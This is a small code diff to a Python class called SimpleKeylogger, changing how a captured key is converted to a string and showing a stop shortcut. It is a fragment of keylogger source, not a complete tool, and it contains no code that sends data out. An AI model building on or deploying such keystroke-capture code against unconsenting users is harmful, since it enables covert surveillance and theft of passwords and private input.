@@ -61,7 +61,7 @@ class SimpleKeylogger(IKeylogger):
         if is_pressed("shift+alt+p"):  # TODO: Modify the shortcut, and better implementation maybe.
             self.stop()
         try:
-            key_pressed = key_to_char(key)
+            key_pressed = str(key_to_char(key))
         except Exception as e:
             print(f"Error processing key: {e}")
             return
